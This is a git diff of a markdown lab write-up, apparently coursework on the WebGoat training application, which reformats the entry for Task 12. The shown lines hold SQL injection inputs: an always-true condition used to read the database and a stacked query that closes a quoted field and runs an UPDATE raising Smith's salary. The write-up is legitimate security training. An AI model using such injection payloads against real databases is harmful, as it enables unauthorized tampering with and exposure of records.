@@ -164,7 +164,10 @@ With the command `Smith' or '1'1` and `3SL99A or '1'1`I got access to databse
 
 #### Task 12
 
-With the command `3SL99A';UPDATE Employees SET salary=100000 WHERE last_name='Smith' AND auth_tan='3SL99A';--` I changed salary of Smith.
+With the command 
+
+`3SL99A';UPDATE Employees SET salary=100000 WHERE last_name='Smith' AND auth_tan='3SL99A';--`
+I changed salary of Smith.
 
 <img src="https://github.com/Sakhi97/Information_security/blob/main/h2/webgoat12.png" width="650" height="250">
 
